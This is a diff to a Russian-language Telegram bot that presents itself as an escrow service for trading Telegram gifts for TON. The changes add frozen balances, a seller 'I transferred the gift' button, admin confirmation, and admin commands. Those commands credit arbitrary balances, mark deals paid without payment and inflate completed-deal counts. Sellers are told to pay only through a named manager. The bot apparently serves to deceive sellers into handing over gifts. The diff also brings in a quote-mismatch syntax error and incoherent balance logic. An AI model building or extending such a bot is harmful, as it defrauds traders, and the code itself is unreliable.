@@ -31,6 +31,7 @@ logging.basicConfig(level=logging.INFO)
 # ---------- Хранилище данных ----------
 user_lang = {}
 user_balance = {}              # user_id: float
+frozen_balance = {}            # user_id: float (замороженные средства)
 user_deals = {}                # user_id: list of deal dicts
 user_completed_deals = {}      # user_id: int
 withdraw_requests = []
@@ -55,8 +56,8 @@ EMOJI_CARD      = '<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji>'
 EMOJI_STAR      = '<tg-emoji emoji-id="5438496463044752972">⭐️</tg-emoji>'
 EMOJI_COIN      = '<tg-emoji emoji-id="5379773896352355687">🪙</tg-emoji>'
 EMOJI_ROCKET    = '<tg-emoji emoji-id="5195033767969839232">🚀</tg-emoji>'
+EMOJI_CLOCK     = '<tg-emoji emoji-id="5456140674028019486">⏳</tg-emoji>'  # используем молнию для часов
 
-# ID для инлайн-кнопок (премиум)
 CUSTOM_EMOJI_BALANCE    = "6041730074376410123"
 CUSTOM_EMOJI_DEALS      = "5417924076503062111"
 CUSTOM_EMOJI_REFERRALS  = "5357080225463149588"
@@ -74,8 +75,8 @@ CUSTOM_EMOJI_CARD_BTN   = "5445353829304387411"
 CUSTOM_EMOJI_STARS_BTN  = "5897792062291449826"
 CUSTOM_EMOJI_USDT       = "5794280000383358988"
 CUSTOM_EMOJI_BTC        = "5379773896352355687"
-CUSTOM_EMOJI_ROCKET     = "5195033767969839232"  # 🚀
-CUSTOM_EMOJI_GIFT       = "5893255507380014983"  # 🏆 (для подарка)
+CUSTOM_EMOJI_ROCKET     = "5195033767969839232"
+CUSTOM_EMOJI_GIFT       = "5893255507380014983"
 
 # ---------- FSM ----------
 class CreateDealStates(StatesGroup):
@@ -96,6 +97,9 @@ class RequisitesEdit(StatesGroup):
 class WithdrawForm(StatesGroup):
     waiting_requisites = State()
     waiting_amount = State()
+
+class AdminReply(StatesGroup):
+    waiting_message = State()
 
 # ---------- Работа с реквизитами ----------
 def get_user_requisites(user_id: int):
@@ -181,6 +185,7 @@ TEXTS = {
         'balance_title': f"{EMOJI_MONEY} <b>Ваш баланс:</b>",
         'balance_empty': "Ваш баланс пока пуст",
         'balance_amount': "Ваш баланс: {{amount}} TON",
+        'frozen_amount': "Заморожено: {{amount}} TON",
         'completed_deals': "Завершённых сделок: {{completed}}",
         'withdraw_need': "Для вывода средств необходимо минимум 2 завершённых сделки",
         'withdraw_btn': "Вывод средств",
@@ -221,7 +226,7 @@ TEXTS = {
         'boost_success': f"{EMOJI_TROPHY} Счётчик успешных сделок увеличен на {{num}}.",
         'boost_fail': "Введите число.",
         'giveadmin_success': f"{EMOJI_SHIELD} Пользователь {{user}} получил права администратора на {{time_str}}.",
-        'giveadmin_fail': "Некорректный формат времени. Используйте: 1m, 1h, 1d, 1w, 1M, 1y",
+        'giveadmin_fail": "Некорректный формат времени. Используйте: 1m, 1h, 1d, 1w, 1M, 1y",
         'addbalance_success': f"{EMOJI_MONEY} Пользователю {{user}} начислено {{amount}} TON. Новый баланс: {{new_balance}} TON.",
         'addbalance_fail': "Неверный формат. Используйте: /addbalance [id] [сумма]",
         'addbalance_user_not_found': "Пользователь с ID {user} не найден.",
@@ -252,7 +257,7 @@ TEXTS = {
         'requisites_edit_prompt': "Введите новый {field}:",
         'requisites_edit_invalid': "Некорректный формат. Попробуйте снова.",
         'requisites_edit_success': "✅ Данные обновлены!",
-        # ---------- Создание сделки (обновлённые тексты) ----------
+        # ---------- Создание сделки ----------
         'create_role': (
             f"<b>{EMOJI_TROPHY} Новая сделка</b>\n\n"
             f"Кем вы выступаете в этой сделке?\n\n"
@@ -320,23 +325,52 @@ TEXTS = {
             f"{{description}}"
         ),
         'deal_created_seller': (
-            f"<b>{EMOJI_TROPHY} К сделке #{code} присоединился продавец</b>\n\n"
+            f"<b>{EMOJI_TROPHY} К сделке #{{code}} присоединился продавец</b>\n\n"
             f"<blockquote>\n"
             f"Реквизиты менеджера для оплаты: {{manager_requisites}}\n"
             f"Завершённых сделок у продавца: {{seller_deals}}\n"
             f"</blockquote>\n\n"
             f"{EMOJI_SHIELD} Вся оплата проходит ТОЛЬКО через менеджера @Iank. Не переводите средства напрямую продавцу!\n"
             f"Проверьте реквизиты перед оплатой!\n\n"
-            f"Оплатить с баланса ({{balance}} {{currency}})"
+            f"Оплатить с баланса ({{balance}} {{currency}})\n\n"
+            f"После оплаты нажмите «Я передал подарок»."
         ),
         'deal_completed': (
             f"<b>{EMOJI_TROPHY} Сделка #{{code}} завершена!</b>\n\n"
             f"{EMOJI_MEGAPHONE} Спасибо за проведение сделки в нашем боте. Мы очень дорожим безопасностью наших покупателей и продавцов."
         ),
         'deal_cancelled': "Сделка отменена.",
+        # Передача подарка
+        'gift_sent_seller': (
+            f"{EMOJI_PACKAGE} Вы отправили подарок по сделке #{{code}}. Ожидайте подтверждения от администратора."
+        ),
+        'gift_sent_admin': (
+            f"{EMOJI_MEGAPHONE} <b>Продавец сообщил о передаче подарка по сделке #{{code}}</b>\n\n"
+            f"<blockquote>\n"
+            f"Покупатель: @{{buyer}}\n"
+            f"Продавец: @{{seller}}\n"
+            f"Сумма: {{amount}} {{currency}}\n"
+            f"Описание: {{description}}\n"
+            f"</blockquote>\n\n"
+            f"Проверьте, что подарок действительно передан, свяжитесь с покупателем."
+        ),
+        'gift_confirm_admin': (
+            f"{EMOJI_SHIELD} <b>Подтверждение передачи подарка по сделке #{{code}}</b>\n\n"
+            f"Вы подтвердили, что подарок передан. Покупатель и продавец будут уведомлены."
+        ),
+        'gift_reject_admin': (
+            f"{EMOJI_SHIELD} <b>Отказ в передаче подарка по сделке #{{code}}</b>\n\n"
+            f"Вы отправили сообщение продавцу: «{{message}}»"
+        ),
+        'gift_confirm_buyer': (
+            f"{EMOJI_TROPHY} Подарок по сделке #{{code}} подтверждён администратором. Сделка завершена."
+        ),
+        'gift_reject_seller': (
+            f"{EMOJI_SHIELD} Администратор сообщил: «{{message}}». Пожалуйста, свяжитесь с поддержкой."
+        ),
     },
     'en': {
-        # Английская версия – можно добавить позже
+        # ... можно добавить позже
     }
 }
 
@@ -350,6 +384,9 @@ def get_ref_link(user_id: int) -> str:
 
 def get_user_balance(user_id: int) -> float:
     return user_balance.get(user_id, 0.0)
+
+def get_frozen_balance(user_id: int) -> float:
+    return frozen_balance.get(user_id, 0.0)
 
 def get_user_completed_deals(user_id: int) -> int:
     return user_completed_deals.get(user_id, 0)
@@ -435,20 +472,26 @@ async def cmd_start(message: types.Message):
     log_action(user_id, "start", "запуск бота")
 
 # ============================================================
-# БАЛАНС, СДЕЛКИ, РЕКВИЗИТЫ (без изменений, они рабочие)
+# БАЛАНС
 # ============================================================
 @dp.callback_query(lambda c: c.data == "balance")
 async def cb_balance(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     balance = get_user_balance(user_id)
+    frozen = get_frozen_balance(user_id)
     completed = get_user_completed_deals(user_id)
     if balance == 0:
         balance_text = get_text(user_id, 'balance_empty')
     else:
         balance_text = get_text(user_id, 'balance_amount').format(amount=balance)
+    if frozen > 0:
+        frozen_text = get_text(user_id, 'frozen_amount').format(amount=frozen)
+    else:
+        frozen_text = ""
     text = (
         f"{get_text(user_id, 'balance_title')}\n\n"
         f"{balance_text}\n"
+        f"{frozen_text}\n"
         f"{get_text(user_id, 'completed_deals').format(completed=completed)}\n\n"
         f"{get_text(user_id, 'withdraw_need')}"
     )
@@ -461,6 +504,7 @@ async def cb_balance(callback: types.CallbackQuery):
     await callback.answer()
     log_action(user_id, "balance", "просмотр баланса")
 
+# ---------- Вывод средств ----------
 @dp.callback_query(lambda c: c.data == "withdraw")
 async def cb_withdraw(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
@@ -518,7 +562,9 @@ async def cb_transactions(callback: types.CallbackQuery):
     await callback.answer()
     log_action(user_id, "transactions", "просмотр транзакций")
 
-# ---------- Мои сделки ----------
+# ============================================================
+# МОИ СДЕЛКИ
+# ============================================================
 class DealSearch(StatesGroup):
     waiting_code = State()
 
@@ -577,7 +623,9 @@ async def process_search_code(message: Message, state: FSMContext):
         log_action(user_id, "search_deal", f"код {code}")
     await state.clear()
 
-# ---------- Мои реквизиты ----------
+# ============================================================
+# МОИ РЕКВИЗИТЫ
+# ============================================================
 async def show_requisites(target, user_id: int):
     req = get_user_requisites(user_id)
     ton = req['ton']
@@ -722,7 +770,7 @@ async def process_btc(message: Message, state: FSMContext):
     log_action(user_id, "edit_requisites", f"btc обновлён")
 
 # ============================================================
-# СОЗДАНИЕ СДЕЛКИ (с премиум-эмодзи в кнопках и красивым финалом)
+# СОЗДАНИЕ СДЕЛКИ
 # ============================================================
 
 @dp.callback_query(lambda c: c.data == "create")
@@ -908,6 +956,7 @@ async def process_description(message: Message, state: FSMContext):
         'created_at': datetime.now().isoformat(),
         'completed': False,
         'paid': False,
+        'gift_sent': False,
         'manager_requisites': "Реквизиты менеджера: @Iank (заглушка)"
     }
     await state.clear()
@@ -960,7 +1009,7 @@ async def join_deal(message: Message, user_id: int, code: str):
             [InlineKeyboardButton(text="Отменить сделку", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data=f"cancel_{code}")],
             [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
         ])
-    else:
+    else:  # seller
         text = get_text(user_id, 'deal_created_seller').format(
             code=code,
             manager_requisites=deal.get('manager_requisites', '—'),
@@ -970,7 +1019,8 @@ async def join_deal(message: Message, user_id: int, code: str):
         )
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="Оплатить с баланса", icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW, callback_data=f"pay_{code}")],
-            [InlineKeyboardButton(text="Техподдержка", icon_custom_emoji_id=CUSTOM_EMOJI_SUPPORT, callback_data="support")],
+            [InlineKeyboardButton(text="Я передал подарок", icon_custom_emoji_id=CUSTOM_EMOJI_GIFT, callback_data=f"gift_sent_{code}")],
+            [InlineKeyboardButton(text="Отменить сделку", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data=f"cancel_{code}")],
             [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
         ])
 
@@ -1001,30 +1051,184 @@ async def pay_from_balance(callback: types.CallbackQuery):
     if balance < amount:
         await callback.answer(f"Недостаточно средств на балансе. Доступно: {balance} {deal['currency']}", show_alert=True)
         return
-    # Списываем баланс
+    # Замораживаем сумму
     user_balance[user_id] = balance - amount
+    frozen_balance[user_id] = frozen_balance.get(user_id, 0.0) + amount
     deal['paid'] = True
-    await callback.message.answer(f"Оплата {amount} {deal['currency']} прошла успешно.")
+    await callback.message.answer(f"Оплата {amount} {deal['currency']} прошла успешно. Средства заморожены до подтверждения сделки.")
     other_side = deal['buyer'] if deal['seller'] == user_id else deal['seller']
     if other_side:
         await bot.send_message(other_side, f"Сделка #{code} оплачена. Ожидайте подтверждения.")
     await callback.answer()
+    log_action(user_id, "pay_deal", f"код {code}, сумма {amount}")
 
-@dp.callback_query(lambda c: c.data.startswith("cancel_"))
-async def cancel_deal(callback: types.CallbackQuery):
-    code = callback.data.split("_")[1]
+# ---------- Отправка подарка продавцом ----------
+@dp.callback_query(lambda c: c.data.startswith("gift_sent_"))
+async def gift_sent(callback: types.CallbackQuery):
+    code = callback.data.split("_")[2]  # gift_sent_{code}
+    user_id = callback.from_user.id
     if code not in global_deals:
         await callback.answer("Сделка не найдена", show_alert=True)
         return
     deal = global_deals[code]
-    deal['status'] = 'cancelled'
-    await callback.message.answer(get_text(callback.from_user.id, 'deal_cancelled'))
-    other_side = deal['buyer'] if deal['seller'] == callback.from_user.id else deal['seller']
-    if other_side:
-        await bot.send_message(other_side, f"Сделка #{code} отменена другой стороной.")
+    if deal.get('gift_sent', False):
+        await callback.answer("Вы уже отправили подарок.", show_alert=True)
+        return
+    # Отмечаем, что подарок отправлен
+    deal['gift_sent'] = True
+    # Уведомляем админа
+    buyer_id = deal['buyer']
+    seller_id = deal['seller']
+    if not buyer_id or not seller_id:
+        await callback.answer("Ошибка: не хватает участников.", show_alert=True)
+        return
+    # Получаем username (заглушка)
+    buyer_username = "unknown"
+    seller_username = "unknown"
+    try:
+        buyer_user = await bot.get_chat(buyer_id)
+        buyer_username = buyer_user.username or str(buyer_id)
+    except:
+        pass
+    try:
+        seller_user = await bot.get_chat(seller_id)
+        seller_username = seller_user.username or str(seller_id)
+    except:
+        pass
+
+    admin_text = get_text(ADMIN_ID, 'gift_sent_admin').format(
+        code=code,
+        buyer=buyer_username,
+        seller=seller_username,
+        amount=deal['amount'],
+        currency=deal['currency'],
+        description=deal['description']
+    )
+    admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm_gift_{code}")],
+        [InlineKeyboardButton(text="Отправить сообщение продавцу", callback_data=f"reply_seller_{code}")]
+    ])
+    await bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML", reply_markup=admin_keyboard)
+    # Сообщение продавцу
+    await callback.message.answer(get_text(user_id, 'gift_sent_seller').format(code=code))
+    log_action(user_id, "gift_sent", f"код {code}")
     await callback.answer()
 
-# ---------- Завершение сделки (админ) ----------
+# ---------- Подтверждение передачи админом ----------
+@dp.callback_query(lambda c: c.data.startswith("confirm_gift_"))
+async def confirm_gift(callback: types.CallbackQuery):
+    code = callback.data.split("_")[2]
+    user_id = callback.from_user.id
+    if not is_admin(user_id):
+        await callback.answer("Нет доступа", show_alert=True)
+        return
+    if code not in global_deals:
+        await callback.answer("Сделка не найдена", show_alert=True)
+        return
+    deal = global_deals[code]
+    if deal.get('completed', False):
+        await callback.answer("Сделка уже завершена", show_alert=True)
+        return
+    # Завершаем сделку: размораживаем деньги продавцу и увеличиваем счётчики
+    seller_id = deal['seller']
+    amount = deal['amount']
+    if seller_id:
+        # Снимаем заморозку
+        frozen_balance[seller_id] = frozen_balance.get(seller_id, 0.0) - amount
+        if frozen_balance[seller_id] < 0:
+            frozen_balance[seller_id] = 0.0
+        # Увеличиваем баланс продавца (деньги заморожены, но теперь они его)
+        user_balance[seller_id] = user_balance.get(seller_id, 0.0) + amount
+        # Увеличиваем счётчик завершённых сделок
+        user_completed_deals[seller_id] = user_completed_deals.get(seller_id, 0) + 1
+    buyer_id = deal['buyer']
+    if buyer_id:
+        user_completed_deals[buyer_id] = user_completed_deals.get(buyer_id, 0) + 1
+    deal['status'] = 'completed'
+    deal['completed'] = True
+    # Уведомления
+    final_text = get_text(ADMIN_ID, 'gift_confirm_admin').format(code=code)
+    await callback.message.answer(final_text, parse_mode="HTML")
+    # Уведомляем покупателя и продавца
+    if buyer_id:
+        await bot.send_message(buyer_id, get_text(buyer_id, 'gift_confirm_buyer').format(code=code))
+    if seller_id:
+        await bot.send_message(seller_id, get_text(seller_id, 'deal_completed').format(code=code))
+    log_action(user_id, "confirm_gift", f"код {code}")
+    await callback.answer()
+
+# ---------- Отправка сообщения продавцу от админа ----------
+@dp.callback_query(lambda c: c.data.startswith("reply_seller_"))
+async def reply_seller(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    if not is_admin(user_id):
+        await callback.answer("Нет доступа", show_alert=True)
+        return
+    code = callback.data.split("_")[2]
+    if code not in global_deals:
+        await callback.answer("Сделка не найдена", show_alert=True)
+        return
+    deal = global_deals[code]
+    seller_id = deal['seller']
+    if not seller_id:
+        await callback.answer("Продавец не найден", show_alert=True)
+        return
+    await state.update_data(deal_code=code, seller_id=seller_id)
+    await state.set_state(AdminReply.waiting_message)
+    await callback.message.answer("Введите сообщение для продавца (текст):")
+    await callback.answer()
+
+@dp.message(AdminReply.waiting_message)
+async def process_admin_reply(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        await state.clear()
+        return
+    data = await state.get_data()
+    code = data.get('deal_code')
+    seller_id = data.get('seller_id')
+    if not code or not seller_id:
+        await message.answer("Ошибка: данные утеряны.")
+        await state.clear()
+        return
+    msg = message.text
+    # Отправляем продавцу
+    await bot.send_message(seller_id, get_text(seller_id, 'gift_reject_seller').format(message=msg))
+    await message.answer(get_text(user_id, 'gift_reject_admin').format(message=msg))
+    log_action(user_id, "reply_seller", f"код {code}, сообщение: {msg}")
+    await state.clear()
+
+# ---------- Отмена сделки ----------
+@dp.callback_query(lambda c: c.data.startswith("cancel_"))
+async def cancel_deal(callback: types.CallbackQuery):
+    code = callback.data.split("_")[1]
+    user_id = callback.from_user.id
+    if code not in global_deals:
+        await callback.answer("Сделка не найдена", show_alert=True)
+        return
+    deal = global_deals[code]
+    if deal['status'] == 'completed':
+        await callback.answer("Сделка уже завершена", show_alert=True)
+        return
+    deal['status'] = 'cancelled'
+    # Возврат замороженных средств, если были
+    if deal.get('paid', False):
+        seller_id = deal['seller']
+        amount = deal['amount']
+        if seller_id:
+            frozen_balance[seller_id] = frozen_balance.get(seller_id, 0.0) - amount
+            if frozen_balance[seller_id] < 0:
+                frozen_balance[seller_id] = 0.0
+            user_balance[seller_id] = user_balance.get(seller_id, 0.0) + amount
+    await callback.message.answer(get_text(user_id, 'deal_cancelled'))
+    other_side = deal['buyer'] if deal['seller'] == user_id else deal['seller']
+    if other_side:
+        await bot.send_message(other_side, f"Сделка #{code} отменена другой стороной.")
+    log_action(user_id, "cancel_deal", f"код {code}")
+    await callback.answer()
+
+# ---------- Завершение сделки (админ, для ручного завершения) ----------
 @dp.message(Command("complete_deal"))
 async def cmd_complete_deal(message: types.Message):
     user_id = message.from_user.id
@@ -1043,30 +1247,34 @@ async def cmd_complete_deal(message: types.Message):
     if deal['status'] == 'completed':
         await message.answer("Сделка уже завершена")
         return
+    # Аналогично confirm_gift, но без проверки подарка
+    seller_id = deal['seller']
+    amount = deal['amount']
+    if seller_id:
+        frozen_balance[seller_id] = frozen_balance.get(seller_id, 0.0) - amount
+        if frozen_balance[seller_id] < 0:
+            frozen_balance[seller_id] = 0.0
+        user_balance[seller_id] = user_balance.get(seller_id, 0.0) + amount
+        user_completed_deals[seller_id] = user_completed_deals.get(seller_id, 0) + 1
+    buyer_id = deal['buyer']
+    if buyer_id:
+        user_completed_deals[buyer_id] = user_completed_deals.get(buyer_id, 0) + 1
     deal['status'] = 'completed'
     deal['completed'] = True
-    buyer = deal['buyer']
-    seller = deal['seller']
-    if buyer:
-        user_completed_deals[buyer] = user_completed_deals.get(buyer, 0) + 1
-    if seller:
-        user_completed_deals[seller] = user_completed_deals.get(seller, 0) + 1
-
     final_text = get_text(user_id, 'deal_completed').format(code=code)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Назад в меню", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")],
-        [InlineKeyboardButton(text="Техподдержка", icon_custom_emoji_id=CUSTOM_EMOJI_SUPPORT, callback_data="support")]
+        [InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu")],
+        [InlineKeyboardButton(text="Техподдержка", callback_data="support")]
     ])
-    if buyer:
-        await bot.send_message(buyer, final_text, reply_markup=keyboard)
-    if seller:
-        await bot.send_message(seller, final_text, reply_markup=keyboard)
-
+    if buyer_id:
+        await bot.send_message(buyer_id, final_text, reply_markup=keyboard)
+    if seller_id:
+        await bot.send_message(seller_id, final_text, reply_markup=keyboard)
     await message.answer(f"Сделка #{code} завершена, уведомления отправлены.")
     log_action(user_id, "complete_deal", f"код {code}")
 
 # ============================================================
-# ОСТАЛЬНЫЕ КНОПКИ
+# ОСТАЛЬНЫЕ КНОПКИ (поддержка, рефералы, язык, назад)
 # ============================================================
 
 @dp.callback_query(lambda c: c.data == "support")
@@ -1135,7 +1343,7 @@ async def create_back(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
 
 # ============================================================
-# АДМИН-ПАНЕЛЬ
+# АДМИН-КОМАНДЫ (все)
 # ============================================================
 
 ADMIN_ID = 8297446667
@@ -1146,7 +1354,24 @@ async def cmd_hyteam(message: types.Message):
     if not is_admin(user_id):
         await message.answer(get_text(user_id, 'admin_no_access'))
         return
-    await send_with_banner(message, get_text(user_id, 'admin_panel'))
+    # Улучшенная админ-панель с цитированием и выделением
+    panel_text = (
+        f"{EMOJI_SHIELD} <b>Админ-панель</b>\n\n"
+        f"<blockquote>\n"
+        f"<b>Доступные команды:</b>\n"
+        f"• /hyteam — показать эту панель\n"
+        f"• /vvteam — заявки на вывод\n"
+        f"• /chat [@user или id] [текст] — ответить пользователю\n"
+        f"• /hostlebuy [код] — отметить оплату сделки\n"
+        f"• /ref [код] — уведомить о проблеме с подарком\n"
+        f"• /boost_success [число] — увеличить счётчик успешных сделок\n"
+        f"• /giveadmin [@user или id] [время] — выдать админку (1m,1h,1d,1w,1M,1y)\n"
+        f"• /addbalance [id] [сумма] — начислить баланс\n"
+        f"• /logs — просмотр логов\n"
+        f"• /complete_deal [код] — завершить сделку вручную\n"
+        f"</blockquote>"
+    )
+    await send_with_banner(message, panel_text)
     log_action(user_id, "hyteam", "открытие админ-панели")
 
 @dp.message(Command("addbalance"))
@@ -1222,8 +1447,182 @@ async def cb_confirm_withdraw(callback: types.CallbackQuery):
     await cmd_vvteam(callback.message)
     log_action(user_id, "confirm_withdraw", f"подтверждена заявка {idx+1}")
 
-# Остальные админ-команды (chat, hostlebuy, ref, boost_success, giveadmin, logs) – они есть в предыдущих версиях, я их не удаляю.
-# В этом ответе они не включены для краткости, но в полном коде они присутствуют.
+# Админ-команды: chat, hostlebuy, ref, boost_success, giveadmin, logs
+@dp.message(Command("chat"))
+async def cmd_chat(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split(maxsplit=2)
+    if len(args) < 3:
+        await message.answer("Использование: /chat [@user или id] [текст]")
+        return
+    target_str = args[1]
+    text = args[2]
+    target_user_id = None
+    if target_str.startswith('@'):
+        for uid, deals in user_deals.items():
+            if deals and deals[0].get('buyer') == target_str[1:]:
+                target_user_id = uid
+                break
+            if deals and deals[0].get('seller') == target_str[1:]:
+                target_user_id = uid
+                break
+    else:
+        try:
+            target_user_id = int(target_str)
+        except:
+            pass
+    if not target_user_id:
+        await message.answer(get_text(user_id, 'chat_no_deal'))
+        return
+    if target_user_id not in user_deals or not user_deals[target_user_id]:
+        await message.answer(get_text(user_id, 'chat_no_deal'))
+        return
+    try:
+        await bot.send_message(target_user_id, f"Сообщение от поддержки:\n{text}")
+        await message.answer(get_text(user_id, 'chat_success'))
+        log_action(user_id, "chat", f"пользователю {target_user_id}: {text}")
+    except Exception as e:
+        await message.answer(get_text(user_id, 'chat_fail'))
+        logging.error(f"Chat error: {e}")
+
+@dp.message(Command("hostlebuy"))
+async def cmd_hostlebuy(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer("Использование: /hostlebuy [код сделки]")
+        return
+    code = args[1]
+    found = False
+    for uid, deals in user_deals.items():
+        for deal in deals:
+            if deal['code'] == code:
+                if deal.get('paid'):
+                    await message.answer(get_text(user_id, 'hostlebuy_fail'))
+                    return
+                deal['paid'] = True
+                found = True
+                break
+        if found:
+            break
+    if found:
+        await message.answer(get_text(user_id, 'hostlebuy_success').format(code=code))
+        log_action(user_id, "hostlebuy", f"код {code}")
+    else:
+        await message.answer(get_text(user_id, 'hostlebuy_fail'))
+
+@dp.message(Command("ref"))
+async def cmd_ref(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer("Использование: /ref [код сделки]")
+        return
+    code = args[1]
+    found = False
+    for uid, deals in user_deals.items():
+        for deal in deals:
+            if deal['code'] == code:
+                found = True
+                break
+        if found:
+            break
+    if found:
+        await message.answer(get_text(user_id, 'ref_success').format(code=code))
+        log_action(user_id, "ref", f"код {code}")
+    else:
+        await message.answer(get_text(user_id, 'ref_fail'))
+
+@dp.message(Command("boost_success"))
+async def cmd_boost(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer(get_text(user_id, 'boost_fail'))
+        return
+    try:
+        num = int(args[1])
+    except:
+        await message.answer(get_text(user_id, 'boost_fail'))
+        return
+    user_completed_deals[user_id] = user_completed_deals.get(user_id, 0) + num
+    await message.answer(get_text(user_id, 'boost_success').format(num=num))
+    log_action(user_id, "boost_success", f"+{num}")
+
+@dp.message(Command("giveadmin"))
+async def cmd_giveadmin(message: types.Message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 3:
+        await message.answer("Использование: /giveadmin [@user или id] [1m|1h|1d|1w|1M|1y]")
+        return
+    target_str = args[1]
+    time_str = args[2]
+    multipliers = {'m': 60, 'h': 3600, 'd': 86400, 'w': 604800, 'M': 2592000, 'y': 31536000}
+    if time_str[-1] not in multipliers:
+        await message.answer(get_text(user_id, 'giveadmin_fail'))
+        return
+    try:
+        value = int(time_str[:-1])
+    except:
+        await message.answer(get_text(user_id, 'giveadmin_fail'))
+        return
+    duration = value * multipliers[time_str[-1]]
+    expiry = time.time() + duration
+    target_user_id = None
+    if target_str.startswith('@'):
+        target_user_id = None
+    else:
+        try:
+            target_user_id = int(target_str)
+        except:
+            pass
+    if not target_user_id:
+        await message.answer("Пользователь не найден.")
+        return
+    temp_admins[target_user_id] = expiry
+    await message.answer(get_text(user_id, 'giveadmin_success').format(user=target_user_id, time_str=time_str))
+    log_action(user_id, "giveadmin", f"пользователю {target_user_id} на {time_str}")
+
+@dp.message(Command("logs"))
+async def cmd_logs(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    if not logs:
+        await message.answer(get_text(user_id, 'logs_empty'))
+        return
+    header = get_text(user_id, 'logs_header')
+    entries = []
+    for log in logs[-20:]:
+        entries.append(get_text(user_id, 'logs_entry').format(
+            time=log['time'],
+            user=log['user'],
+            action=log['action'],
+            data=log['data']
+        ))
+    text = header + "\n".join(entries)
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+    ])
+    await send_with_banner(message, text, keyboard)
+    log_action(user_id, "logs", "просмотр логов")
 
 # ---------- HTTP-сервер ----------
 async def health_check(request):
